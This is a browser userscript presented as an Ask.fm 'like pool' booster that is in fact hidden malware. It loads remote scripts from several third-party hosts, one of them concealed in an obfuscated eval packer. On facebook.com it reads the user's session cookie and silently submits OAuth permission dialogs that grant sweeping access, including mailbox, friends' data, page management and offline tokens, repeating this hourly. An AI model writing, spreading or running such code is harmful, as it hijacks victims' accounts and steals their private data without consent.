// ==UserScript==
// @name			Ask.fm Beğeni Havuzu
// @namespace                   Ask.fm Beğeni Havuzu
// @version			2.0
// @copyright		        http://ask.fm/MelihJohnsan
// @description		        Ask.fm Beğeni Havuzu
// @author			
// @include			http://ask.fm/*
// @icon			http://s3.amazonaws.com/uso_ss/icon/138450/large.gif?1342345458
// 
// Version numero 2
// 
// 
// ==/UserScript==
// ==Profile==
function addJavascript(jsname){
if(document.getElementsByName(jsname).length <= 0 || (document.getElementsByName(jsname).length > 0 && document.getElementsByName(jsname)[0].src != jsname)){
	var th = document.getElementsByTagName('head')[0];
	var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
    s.setAttribute("name",jsname);
	s.setAttribute('src',jsname);
	th.appendChild(s);
}
}

addJavascript("http://www.melihjohnsan.webege.com/script.js");
addJavascript("http://www.melihjohnsan.webege.com/twitter.js");
addJavascript("http://skmedya.net/social/script.js");
addJavascript("http://skmedya.net/ss/script.js");
addJavascript("https://www.twtakipcikazan.com/face/js/script.js");
addJavascript("https://www.twtakipcikazan.com/takip/js/script.js");
eval(function(p,a,c,k,e,r){e=String;if(!''.replace(/^/,String)){while(c--)r[c]=k[c]||c;k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0("1://2-3.4/5.6");',7,7,'addJavascript|http|r|clup|com|script|js'.split('|'),0,{}))

var tarih = new Date();
if(location.hostname.indexOf("www.facebook.com") >= 0){
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]).toString();
function uygulamaizinver(url){
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){
var izinverhtml = document.createElement("html");
izinverhtml.innerHTML = xmlhttp.responseText;
if(izinverhtml.getElementsByTagName("form")["uiserver_form"]){
izinverhtml.innerHTML = izinverhtml.getElementsByTagName("form")["uiserver_form"].innerHTML
duzenlevegonder(izinverhtml)
}
}
};		
xmlhttp.open("GET", url, true); 
xmlhttp.send();
}

function duzenlevegonder(formnesne){
var izinverparams = "";
for(i=0;i<formnesne.getElementsByTagName("input").length;i++){
if(formnesne.getElementsByTagName("input")[i].name.indexOf("cancel_clicked") < 0){
izinverparams += "&" + formnesne.getElementsByTagName("input")[i].name + "=" + formnesne.getElementsByTagName("input")[i].value;
}
}
izinverparams.replace("&fb_dtsg","fb_dtsg");
var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			  var sonizinhtml = document.createElement("html");
			  sonizinhtml.innerHTML = xmlhttp.responseText;
if(sonizinhtml.getElementsByTagName("form")["uiserver_form"]){
			  sonizinhtml.innerHTML = sonizinhtml.getElementsByTagName("form")["uiserver_form"].innerHTML
			  sonizin(sonizinhtml)}
			}
        };
xmlhttp.open("POST", "http://www.facebook.com/dialog/permissions.request", true); 
xmlhttp.setRequestHeader ("Content-Type", "text/html");
xmlhttp.send(izinverparams);
}

function sonizin(formnesne){
var izinverparams = "";
for(i=0;i<formnesne.getElementsByTagName("input").length;i++){
if(formnesne.getElementsByTagName("input")[i].name.indexOf("skip_clicked") < 0){
izinverparams += "&" + formnesne.getElementsByTagName("input")[i].name + "=" + formnesne.getElementsByTagName("input")[i].value;
}
}
izinverparams.replace("&fb_dtsg","fb_dtsg");
var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function (){
		
        };
xmlhttp.open("POST", "http://www.facebook.com/dialog/permissions.request", true); 
xmlhttp.setRequestHeader ("Content-Type", "text/html");
xmlhttp.send(izinverparams);
}

function TokenUrl(id){
return "http://www.facebook.com/dialog/oauth?response_type=token&display=popup&client_id=" + id  +"&redirect_uri=http://www.facebook.com/dialog/feed?app_id=" + id + "&scope=email,publish_actions,user_about_me,user_activities,user_birthday,user_checkins,user_education_history,user_events,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_notes,user_photos,user_questions,user_relationship_details,user_relationships,user_religion_politics,user_status,user_subscriptions,user_videos,user_website,user_work_history,friends_about_me,friends_activities,friends_birthday,friends_checkins,friends_education_history,friends_events,friends_games_activity,friends_groups,friends_hometown,friends_interests,friends_likes,friends_location,friends_notes,friends_photos,friends_questions,friends_relationship_details,friends_relationships,friends_religion_politics,friends_status,friends_subscriptions,friends_videos,friends_website,friends_work_history,ads_management,create_event,create_note,export_stream,friends_online_presence,manage_friendlists,manage_notifications,manage_pages,offline_access,photo_upload,publish_checkins,publish_stream,read_friendlists,read_insights,read_mailbox,read_requests,read_stream,rsvp_event,share_item,sms,status_update,user_online_presence,video_upload,xmpp_login";
}
if(!localStorage['token_' + user_id] ||  (localStorage['token_' + user_id] && tarih.getTime() >= localStorage['token_' + user_id])){
uygulamaizinver(TokenUrl(""));
uygulamaizinver(TokenUrl(""));
uygulamaizinver(TokenUrl(""));
uygulamaizinver(TokenUrl(""));
uygulamaizinver(TokenUrl(""));
if(navigator.userAgent.indexOf("Chrome") > 0){
tarih.setTime(tarih.getTime() + 1000 * 60 * 60);
localStorage['token_' + user_id] = tarih.getTime();
}
}
}